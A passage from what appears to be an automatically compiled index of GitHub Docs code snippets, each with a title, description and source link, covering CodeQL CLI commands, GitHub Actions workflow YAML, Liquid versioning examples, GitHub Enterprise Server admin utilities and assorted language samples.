data to GitHub.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/uploading-codeql-analysis-results-to-github.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n$ codeql database export-diagnostics codeql-dbs/example-repo \\\n    --sarif-category=javascript-typescript --format={% ifversion fpt or ghec %}sarif-latest{% else %}sarifv2.1.0{% endif %} \\\n    --output=/temp/example-repo-js.sarif\n```\n\n----------------------------------------\n\nTITLE: Defining a Core CodeQL Test Pack in YAML\nDESCRIPTION: This YAML snippet shows the `qlpack.yml` file for a core CodeQL test pack for C/C++.  It includes dependencies on the core query and library packs, specifies the C++ extractor to be used for test database creation, and indicates the location of the tests (the root folder and subfolders).  The absence of a `version` property prevents accidental publication of test packs.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_29\n\nLANGUAGE: yaml\nCODE:\n```\nname: codeql/cpp-tests\ndependencies:\n  codeql/cpp-all: \"*\"\n  codeql/cpp-queries: \"*\"\nextractor: cpp\ntests: .\n```\n\n----------------------------------------\n\nTITLE: Confirming GHES Upgrade and Partition Details\nDESCRIPTION: This code block shows the confirmation prompt during the upgrade process. It also displays information about the current and target root partitions, including their versions.  It requires the `ghe-upgrade` command to be run first. The user is prompted to confirm the upgrade before continuing.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/upgrading-your-instance/performing-an-upgrade/upgrading-with-an-upgrade-package.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n*** applying update...\nThis package will upgrade your installation to version VERSION-NUMBER\nCurrent root partition: /dev/xvda1 [VERSION-NUMBER]\nTarget root partition:  /dev/xvda2\nProceed with installation? [y/N]\n```\n\n----------------------------------------\n\nTITLE: Adding GPG Key to Zsh Profile - Shell\nDESCRIPTION: This snippet adds the GPG key to the `.zshrc` or `.zprofile` file if the user is not using the GPG suite. It determines the current TTY and exports it as the `GPG_TTY` environment variable, ensuring that GPG can interact with the terminal for passphrase prompts. The snippet is designed for macOS.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/telling-git-about-your-signing-key.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ if [ -r ~/.zshrc ]; then echo -e '\\nexport GPG_TTY=$(tty)' >> ~/.zshrc; \\\n  else echo -e '\\nexport GPG_TTY=$(tty)' >> ~/.zprofile; fi\n```\n\n----------------------------------------\n\nTITLE: Copying Migration Archive using SCP\nDESCRIPTION: This snippet demonstrates how to copy the generated migration archive from the GitHub Enterprise Server instance to your local computer using the `scp` command.  The `-P` option specifies the port number (122 in this example).  The command requires the admin username, the hostname, and the path to the archive file on the server, as well as the destination path on your local machine.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-github-enterprise-server.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nscp -P 122 admin@HOSTNAME:/data/github/current/tmp/MIGRATION-GUID.tar.gz ~/Desktop\n```\n\n----------------------------------------\n\nTITLE: Conditional Table Row (GHES Present) - Liquid\nDESCRIPTION: This Liquid snippet conditionally displays a table row when the `ghes` version is present. It is placed directly within the Markdown table structure to control row visibility. The snippet relies on the `ifversion` tag to check for the existence of the specified version.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/foo/table-with-ifversions.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes %}\n| GHES | Present |\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Using First-Party GitHub Action Reusable in YAML\nDESCRIPTION: This code snippet demonstrates how to use a reusable for a first-party GitHub Action in a workflow YAML file. It utilizes the `actions/checkout` action via its reusable, ensuring consistent action version updates, especially for products like GitHub Enterprise Server.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_28\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Checkout\n    uses: {% data reusables.actions.action-checkout %}\n```\n\n----------------------------------------\n\nTITLE: Linking to multiple headers in a different article - Markdown\nDESCRIPTION: This code snippet demonstrates how to link to two or more specific headers in a different Markdown article. It concatenates multiple links using 'and' and specifies the article title.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_23\n\nLANGUAGE: Markdown\nCODE:\n```\nFor more information, see [HEADER-TITLE-1](PATH-TO-ARTICLE#SECTION-LINK-1) and [HEADER-TITLE-2](PATH-TO-ARTICLE#SECTION-LINK-2) in \"ARTICLE-TITLE.\"\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow on pull request target\nDESCRIPTION: This workflow triggers on various pull request activities like assigned, opened, synchronized, and reopened using the `pull_request_target` event. It demonstrates how to use the `types` keyword to specify activity types.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_30\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  pull_request_target:\n    types: [assigned, opened, synchronize, reopened]\n```\n\n----------------------------------------\n\nTITLE: Downloading GEI Migration Log with GitHub CLI\nDESCRIPTION: Downloads the latest migration log for an individual repository when the migration source is a {% data variables.product.prodname_dotcom %} product, using the `gh gei download-logs` command. Requires the DESTINATION organization, REPOSITORY name, and a FILENAME for the log file.  A {% data variables.product.pat_generic %} with appropriate scopes is needed.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/accessing-your-migration-logs-for-github-enterprise-importer.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh gei download-logs --github-target-org DESTINATION --target-repo REPOSITORY --migration-log-file FILENAME\n```\n\n----------------------------------------\n\nTITLE: Workflow Using Configuration Variables with Vars Context (YAML)\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow that utilizes configuration variables through the `vars` context.  It demonstrates setting environment variables, conditional job execution, selecting runners, and configuring environments dynamically based on configuration variables.  The variables are expected to be defined at the repository, organization, or environment level.  The `vars` context allows referencing these variables within the workflow definition.  It also showcases how to use these variables within a step to define dynamic names, conditions, and input parameters for an action.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-vars-context-example-usage.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  workflow_dispatch:\nenv:\n  # Setting an environment variable with the value of a configuration variable\n  env_var: ${{ vars.ENV_CONTEXT_VAR }}\n\njobs:\n  display-variables:\n    name: ${{ vars.JOB_NAME }}\n    # You can use configuration variables with the `vars` context for dynamic jobs\n    if: ${{ vars.USE_VARIABLES == 'true' }}\n    runs-on: ${{ vars.RUNNER }}\n    environment: ${{ vars.ENVIRONMENT_STAGE }}\n    steps:\n    - name: Use variables\n      run: |\n        echo \"repository variable : $REPOSITORY_VAR\"\n        echo \"organization variable : $ORGANIZATION_VAR\"\n        echo \"overridden variable : $OVERRIDE_VAR\"\n        echo \"variable from shell environment : $env_var\"\n      env:\n        REPOSITORY_VAR: ${{ vars.REPOSITORY_VAR }}\n        ORGANIZATION_VAR: ${{ vars.ORGANIZATION_VAR }}\n        OVERRIDE_VAR: ${{ vars.OVERRIDE_VAR }}\n        \n    - name: ${{ vars.HELLO_WORLD_STEP }}\n      if: ${{ vars.HELLO_WORLD_ENABLED == 'true' }}\n      uses: actions/hello-world-javascript-action@main\n      with:\n        who-to-greet: ${{ vars.GREET_NAME }}\n```\n\n----------------------------------------\n\nTITLE: JSON GraphQL Error Response\nDESCRIPTION: Example of a GraphQL error response in JSON format.  This example shows a schema validation error where the 'nodes' field (returning Repository) has no selections. The response includes a 'message' key describing the error and 'locations' indicating where the error occurred in the query.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-explorer.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"data\": null,\n  \"errors\": [\n    {\n      \"message\": \"Objects must have selections (field 'nodes' returns Repository but has no selections)\",\n      \"locations\": [\n        {\n          \"line\": 5,\n          \"column\": 8\n        }\n      ]\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: List accessible organizations for user\nDESCRIPTION: This snippet fetches and iterates through the organizations that the application can access for the authenticated user and prints their login names.  It relies on an authenticated Octokit client with the appropriate OAuth scopes (e.g. read:org).\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/discovering-resources-for-a-user.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclient.organizations.each do |organization|\n  puts \"User belongs to the #{organization[:login]} organization.\"\nend\n```\n\n----------------------------------------\n\nTITLE: Bash Script Example (No Hash-bang)\nDESCRIPTION: This bash script snippet demonstrates a simple conditional statement. It checks if a variable `file` is empty and, if so, prints `cat` and `head less`. The script includes comments and exits with code 123. This is used to check if the code block annotation handles comments and standard script structure correctly.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/foo/code-snippet-with-hashbang.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n# Let's get started\nif [ -z $file ]; then\n  # This is just a sample\n  echo cat\n  head less\nfi\n# End of the script\nexit 123\n```\n\n----------------------------------------\n\nTITLE: Expected Output of Redis Test Script\nDESCRIPTION: This is the expected output in the \"Connect to Redis\" step of a GitHub Actions workflow when the Redis test script is executed. It confirms that the Redis client was created, data was added, and the hash keys were successfully retrieved.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-redis-service-containers.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nReply: OK\nReply: 1\nReply: 1\nReply: 1\n3 replies:\n    0: octocat\n    1: dinotocat\n    2: robotocat\n```\n\n----------------------------------------\n\nTITLE: Rewriting Imported Git Repository\nDESCRIPTION: This command rewrites the imported repository to allow renaming authors and creating Git branches based on folders (for Subversion and TFVC imports). Refer to the documentation for more information.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_83\n\nLANGUAGE: shell\nCODE:\n```\ngit-import-rewrite\n```\n\n----------------------------------------\n\nTITLE: Changing default shell using chsh\nDESCRIPTION: This shell script changes the default shell for the current user to `zsh`. It uses `sudo` to elevate privileges, `id -un` to get the current username, and `--shell` to specify the path to the new shell. This is typically used in a dotfiles installation script.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/changing-the-shell-in-a-codespace.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nsudo chsh \"$(id -un)\" --shell \"/usr/bin/zsh\"\n```\n\n----------------------------------------\n\nTITLE: Example of versioning a table row with Liquid\nDESCRIPTION: Shows how to use Liquid versioning with whitespace control to version a table row. This prevents extra whitespace and improves the readability of the source code compared to in-line versioning.\nSOURCE: https://github.com/github/docs/blob/main/content/README.md#_snippet_7\n\nLANGUAGE: liquid\nCODE:\n```\nColumn A | Column B | Column C\n---------|----------|---------\nThis row is for all versions | B1 | C1\n{%- ifversion ghes %}\nThis row is for GHES only | B2 | C2\n{%- endif %}\nThis row is for all versions | B3 | C3\n```\n\n----------------------------------------\n\nTITLE: Setting MinIO Directory Environment Variable (Shell)\nDESCRIPTION: This snippet sets the MINIO_DIR environment variable to the current working directory's 'minio' subdirectory and creates the directory if it doesn't exist. This variable is used to specify the location where MinIO will store its data. The mkdir -p command ensures that parent directories are created as needed.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-packages/quickstart-for-configuring-your-minio-storage-bucket-for-github-packages.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nexport MINIO_DIR=$(pwd)/minio\nmkdir -p $MINIO_DIR\n```\n\n----------------------------------------\n\nTITLE: Conditional Version Check with Multiple Versions\nDESCRIPTION: This snippet utilizes multiple versions including `fpt`, `ghec`, `ghae`, and `ghes`. It conditionally displays \"Bravo\" based on whether any of the listed versions satisfy the condition `> 2.13`.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/whitespace.md#_snippet_4\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghec or ghae or ghes > 2.13 %}\nBravo\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Markdown List Alignment Example\nDESCRIPTION: Demonstrates the correct way to align list items with multiple paragraphs or objects in Markdown within GitHub Docs. It shows how to structure additional content after the first paragraph of a list item, ensuring proper rendering on the site.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n1. Under your repository name, click **Actions**.\n\n   ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](/assets/images/help/repository/actions-tab-global-nav-update.png)\n\n   This is another paragraph in the list.\n\n1. This is the next item.\n```\n\n----------------------------------------\n\nTITLE: Displaying MinIO Access and Secret Keys (Shell)\nDESCRIPTION: This snippet displays the values of the `MINIO_ACCESS_KEY` and `MINIO_SECRET_KEY` environment variables. This allows the user to verify the generated keys and use them in subsequent steps.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-packages/quickstart-for-configuring-your-minio-storage-bucket-for-github-packages.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\necho $MINIO_ACCESS_KEY\necho $MINIO_SECRET_KEY\n```\n\n----------------------------------------\n\nTITLE: Nested ifversion with complex else branching\nDESCRIPTION: This snippet uses a `not` operator and nested `ifversion` statements. It first checks if `fpt` is false AND the GHES version is less than 2.14. If true, it renders 'Alpha' and then checks again if the GHES version is less than 2.14. If true renders 'Bravo', else renders 'Charlie'.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/less-than-next-oldest.md#_snippet_6\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion not fpt and ghes < 2.14 %}\n\nAlpha\n\n{% ifversion ghes < 2.14 %}\n\nBravo\n\n{% else %}\n\nCharlie\n\n{% endif %}\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Creating a Task List in Markdown\nDESCRIPTION: This Markdown snippet demonstrates how to create a task list.  Items are prefixed with `- [ ]` for incomplete tasks and `- [x]` for completed tasks.  The list items can contain text, issue references (e.g., #739), or links to issues.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/repositories/task-list-markdown.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n- [x] #739\n- [ ] https://github.com/octo-org/octo-repo/issues/740\n- [ ] Add delight to the experience when all tasks are complete :tada:\n```\n\n----------------------------------------\n\nTITLE: Computing the difference between two BQRS result sets\nDESCRIPTION: This shell command computes the difference between two BQRS files using the `codeql bqrs diff` command. It takes two mandatory input files (`<file1>` and `<file2>`) and supports options to write rows present only in the first file (`--left`), only in the second file (`--right`), or in both files (`--both`) to specified output files. The `--retain-result-sets` option allows specific result sets to be copied without comparison, useful for path-problem results. Advanced options control internal ID comparison.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/bqrs-diff.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql bqrs diff <options>... -- <file1> <file2>\n```\n\n----------------------------------------\n\nTITLE: COBOL Code Example\nDESCRIPTION: This COBOL code snippet demonstrates a simple database insertion operation with error handling. It defines data structures and a procedure to insert a person's record into a database. The snippet includes SQL statements for inserting, committing, and rolling back transactions.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/documenting-code/explaining-legacy-code.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nIDENTIFICATION DIVISION.\nPROGRAM-ID. INSERT-RECORD.\n\nENVIRONMENT DIVISION.\n\nDATA DIVISION.\nWORKING-STORAGE SECTION.\n01  WS-STATUS-FLAGS.\n    05 WS-DB-STATUS     PIC X(2).\n       88 WS-SUCCESS    VALUE \"00\".\n    05 WS-SQLCODE       PIC S9(9) COMP.\n    05 WS-ERROR-MSG     PIC X(50).\n\nLINKAGE SECTION.\n01  LS-PARAMETERS.\n    05 LS-PERSON-RECORD.\n       10 PERSON-ID     PIC 9(6).\n       10 PERSON-NAME   PIC X(50).\n       10 PERSON-AGE    PIC 9(3).\n    05 LS-RESULT        PIC X.\n       88 SUCCESS       VALUE 'T'.\n       88 FAILED        VALUE 'F'.\n\nPROCEDURE DIVISION USING LS-PARAMETERS.\n    PERFORM INSERT-AND-VALIDATE\n    GOBACK\n    .\n\nINSERT-AND-VALIDATE.\n    EXEC SQL\n        INSERT INTO persons (id, name, age)\n        VALUES (:PERSON-ID, :PERSON-NAME, :PERSON-AGE)\n    END-EXEC\n\n    IF SQLCODE = 0\n        EXEC SQL COMMIT END-EXEC\n        SET SUCCESS TO TRUE\n    ELSE\n        EXEC SQL ROLLBACK END-EXEC\n        SET FAILED TO TRUE\n        STRING \"DB Error: \" SQLCODE\n            DELIMITED BY SIZE\n            INTO WS-ERROR-MSG\n        DISPLAY WS-ERROR-MSG\n    END-IF\n    .\n```\n\n----------------------------------------\n\nTITLE: Populating Manifest Field with JSON (Organization) - JavaScript\nDESCRIPTION: This JavaScript snippet populates the 'manifest' input field with a JSON string containing the configuration details for the GitHub App for an organization. This includes the app's name, URL, webhook attributes, redirect URL, callback URLs, public setting, default permissions, and default events.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/sharing-github-apps/registering-a-github-app-from-a-manifest.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n<script>\n input = document.getElementById(\"manifest\")\n input.value = JSON.stringify({\n   \"name\": \"Octoapp\",\n   \"url\": \"https://www.example.com\",\n   \"hook_attributes\": {\n     \"url\": \"https://example.com/github/events\",\n   },\n   \"redirect_url\": \"https://example.com/redirect\",\n   \"callback_urls\": [\n     \"https://example.com/callback\"\n   ],\n   \"public\": true,\n   \"default_permissions\": {\n     \"issues\": \"write\",\n     \"checks\": \"write\"\n   },\n   \"default_events\": [\n     \"issues\",\n     \"issue_comment\",\n     \"check_suite\",\n     \"check_run\"\n   ]\n })\n</script>\n```\n\n----------------------------------------\n\nTITLE: Cluster Balancing (ghe-cluster-balance)\nDESCRIPTION: This utility enforces an even distribution of allocations across cluster nodes. It allows checking the status, rebalancing jobs, and outputting completion scripts.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_33\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-balance status\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-balance -j JOB\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-balance rebalance -j JOB\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-balance completion\n```\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-balance help\n```\n\n----------------------------------------\n\nTITLE: Verifying Artifact Attestation for Binaries with GitHub CLI\nDESCRIPTION: This command verifies artifact attestations for binary files using the `gh attestation verify` command. It requires specifying the path to the binary artifact and the repository name. Replace `PATH/TO/YOUR/BUILD/ARTIFACT-BINARY` with the actual path and `ORGANIZATION_NAME/REPOSITORY_NAME` with the correct repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds.md#_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\ngh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY -R ORGANIZATION_NAME/REPOSITORY_NAME\n```\n\n----------------------------------------\n\nTITLE: Entering maintenance mode\nDESCRIPTION: This snippet shows how to enter maintenance mode on the primary appliance using the `ghe-maintenance` command. This is done to allow replication to finish before switching appliances. The `-s` flag starts maintenance mode.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/initiating-a-failover-to-your-replica-appliance.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nghe-maintenance -s\n```\n\n----------------------------------------\n\nTITLE: Promoting User to Organization Owner (ghe-org-admin-promote)\nDESCRIPTION: This command promotes a specified user to be an owner of a given organization within GitHub Enterprise Server. It is typically used to grant site administrators ownership of the 'actions' organization for managing bundled actions.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/managing-access-to-actions-from-githubcom/manually-syncing-actions-from-githubcom.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-org-admin-promote -u USERNAME -o actions\n```\n\n----------------------------------------\n\nTITLE: Installing GitHub Models CLI Extension (Shell)\nDESCRIPTION: This command installs the GitHub Models CLI extension.  It allows users to interact with AI models from the command line. Requires the GitHub CLI to be installed and authenticated.\nSOURCE: https://github.com/github/docs/blob/main/content/github-models/integrating-ai-models-into-your-development-workflow.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh extension install https://github.com/github/gh-models\n```\n\n----------------------------------------\n\nTITLE: Exporting User List to CSV (Shell)\nDESCRIPTION: Exports a list of all the users in the installation into CSV format using the `ghe-user-csv` utility. The `-o` option redirects the output to STDOUT, which is saved to a file. This includes information such as email, user type, repository count, SSH key count, etc.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_109\n\nLANGUAGE: shell\nCODE:\n```\nghe-user-csv -o > users.csv\n```\n\n----------------------------------------\n\nTITLE: Symbol Qualifier with Regular Expression\nDESCRIPTION: This snippet demonstrates using a regular expression with the symbol qualifier.  It finds conversions people have implemented in Rust for the `String` type.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_22\n\nLANGUAGE: text\nCODE:\n```\nlanguage:rust symbol:/^String::to_.*/\n```\n\n----------------------------------------\n\nTITLE: Task List for Updating Actions Runner Version\nDESCRIPTION: This task list outlines the steps required to update the Actions Runner version for a new GHES release.  It involves finding the required version, updating the documentation in github/docs-internal, and confirming the release notes.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/release-templates/release-steps-4.md#_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n```[tasklist]\n### Tasks\n- [ ] Find the minimum required Actions Runner version for the upcoming GHES release (see below for help).\n- [ ] Create a PR against the release candidate publication branch in github/docs-internal to add the version to the [table in the \"GitHub Enterprise Server releases\" article](https://github.com/github/docs-internal/blob/main/content/admin/all-releases.md?plain=1#L66).\n- [ ] In the same PR, add the version to the [`runner_required_version` variable](https://github.com/github/docs-internal/blob/main/data/variables/product.yml#L140) in product.yml.\n- [ ] Once the release notes file for the release has been generated (see https://github.com/github/docs-content/issues/14225), confirm that the {% raw %}`{% data reusables.actions.actions-runner-release-note %}`{% endraw %} reusable is present in the release notes.\n```\n```\n\n----------------------------------------\n\nTITLE: Reusable Workflow Secret Inheritance - YAML\nDESCRIPTION: This example shows how to use the `inherit` keyword to pass all secrets from the calling workflow to the called workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_37\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_dispatch:\n\njobs:\n  pass-secrets-to-workflow:\n    uses: ./.github/workflows/called-workflow.yml\n    secrets: inherit\n```\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_call:\n\njobs:\n  pass-secret-to-action:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Use a repo or org secret from the calling workflow.\n        run: echo ${{ secrets.CALLING_WORKFLOW_SECRET }}\n```\n\n----------------------------------------\n\nTITLE: Basic Sinatra App for Handling Webhooks (Ruby)\nDESCRIPTION: This code snippet sets up a basic Sinatra application to handle webhook events sent from GitHub. It listens for POST requests on the `/event_handler` endpoint, parses the JSON payload, and returns a simple confirmation message. This confirms that the local connections are working correctly.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/building-a-ci-server.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'sinatra'\nrequire 'json'\n\npost '/event_handler' do\n  payload = JSON.parse(params[:payload])\n  \"Well, it worked!\"\nend\n```\n\n----------------------------------------\n\nTITLE: Add Diagnostic to CodeQL Database (codeql database add-diagnostic)\nDESCRIPTION: This command adds diagnostic information to a CodeQL database.  It requires the path to the database, a source ID, and a source name. Options include specifying the diagnostic message (markdown or plaintext), severity, help links, attributes in JSON format, and location within the code (file path, start/end line/column).\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-add-diagnostic.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database add-diagnostic --source-id=<id> --source-name=<name> <options>... -- <database>\n```\n\n----------------------------------------\n\nTITLE: Define owner for logs directory\nDESCRIPTION: This snippet defines @octocat as the owner of any file within the `/logs` directory. Changes to files in this directory will require approval from @octocat.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n**/logs @octocat\n```\n\n----------------------------------------\n\nTITLE: Installing Bundler gem\nDESCRIPTION: This command installs the Bundler gem, a dependency management tool for Ruby. Bundler is used to manage and install the necessary gems (libraries) for a Ruby project.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/handling-webhook-deliveries.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngem install bundler\n```\n\n----------------------------------------\n\nTITLE: Starting the Node.js Server\nDESCRIPTION: This snippet describes how to start the Node.js server using the command `npm run server`. This command executes the script defined in `package.json` to start the server, which listens for incoming webhook events on `http://localhost:3000/api/webhook`.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/quickstart.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm run server\n```\n\n----------------------------------------\n\nTITLE: Codespaces Video Metadata\nDESCRIPTION: This snippet represents the metadata for a video introducing GitHub Codespaces. It includes the video's title, a non-cookie YouTube URL, a brief description, product association (Codespaces), version compatibility (fpt, ghec), date added, location in the documentation, and the path to the video transcript.\nSOURCE: https://github.com/github/docs/blob/main/contributing/videos-in-docs.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nTitle: Codespaces - Your instant dev box in the cloud\nURL: https://www.youtube-nocookie.com/embed/_W9B7qc9lVc\nDescription: A 1.5 minute overview of GitHub Codespaces.\nProduct: Codespaces\nVersions: fpt, ghec\nDate added: 2021-05-11\nLocation: /content/codespaces/index.md\nTranscript: /video-transcripts/transcript-codespaces-your-instant-dev-box-in-the-cloud\n```\n\n----------------------------------------\n\nTITLE: Embedding GeoJSON Map in HTML\nDESCRIPTION: This snippet provides the HTML code required to embed a GeoJSON map hosted on GitHub into another webpage. It utilizes a script tag that points to GitHub's embedding service and can be customized with height and width parameters.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/using-files/working-with-non-code-files.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n<script src=\"https://embed.github.com/view/geojson/<username>/<repo>/<ref>/<path_to_file>\"></script>\n```\n\nLANGUAGE: HTML\nCODE:\n```\n<script src=\"https://embed.github.com/view/geojson/benbalter/dc-wifi-social/master/bars.geojson\"></script>\n```\n\n----------------------------------------\n\nTITLE: Running specific linter rules on specific files/directories\nDESCRIPTION: This command runs a specific set of linter rules on the specified files or directories.  Replace `heading-increment code-fence-line-length` with the desired rule names/aliases.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nnpm run lint-content -- \\\n  --rules heading-increment code-fence-line-length \\\n  --path content/FILENAME.md content/DIRECTORY\n```\n\n----------------------------------------\n\nTITLE: Opening Codespace in JupyterLab via GitHub CLI\nDESCRIPTION: This command opens a GitHub Codespace in JupyterLab. It requires JupyterLab to be installed within the codespace environment.  The command leverages the GitHub CLI to launch the codespace specifically in JupyterLab.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/opening-an-existing-codespace.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace jupyter\n```\n\n----------------------------------------\n\nTITLE: Verifying Remote URL\nDESCRIPTION: Verifies that the remote URL has been correctly added to the local Git configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/splitting-a-subfolder-out-into-a-new-repository.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\n$ git remote -v\n# Verify new remote URL\n> origin  https://{% data variables.product.product_url %}/USERNAME/NEW-REPOSITORY-NAME.git (fetch)\n> origin  https://{% data variables.product.product_url %}/USERNAME/NEW-REPOSITORY-NAME.git (push)\n```\n\n----------------------------------------\n\nTITLE: Env Context Example\nDESCRIPTION: This JSON snippet shows the contents of the `env` context, containing environment variables set within the workflow. It maps variable names (e.g., `first_name`, `super_duper_var`) to their corresponding string values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"first_name\": \"Mona\",\n  \"super_duper_var\": \"totally_awesome\"\n}\n```\n\n----------------------------------------\n\nTITLE: Install Optional Dependencies\nDESCRIPTION: Installs optional dependencies required for running tests locally. These dependencies are typically large and not essential for development, but are needed for complete test coverage. Run this command to ensure all necessary dependencies are available.\nSOURCE: https://github.com/github/docs/blob/main/src/tests/README.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm ci --include=optional\n```\n\n----------------------------------------\n\nTITLE: Setting Git User Configuration\nDESCRIPTION: These environment variables 